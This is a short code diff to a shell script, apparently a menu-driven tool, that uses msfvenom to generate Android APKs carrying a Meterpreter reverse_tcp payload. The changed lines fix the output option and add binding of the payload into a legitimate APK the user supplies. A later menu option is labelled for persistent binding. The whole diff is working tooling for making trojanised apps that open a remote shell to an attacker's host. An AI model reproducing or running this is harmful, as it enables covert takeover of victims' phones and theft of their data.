@@ -38,7 +38,7 @@ case $x in
         read p
         printf "\nenter name of apk: "
         read nm
-        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk
+        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" -o $nm.apk
         ;;
 2)
         printf "\nBINDED APK ONLY(NON-PERSISTENCE)\n"
@@ -53,7 +53,7 @@ case $x in
         read nm
         printf "\nattach original apk for binding: "
         read f
-        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
+        msfvenom -x $f -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" -o $nm.apk
         ;;
 3)
         printf "\nPERSISTENCE BINDED APK\n"
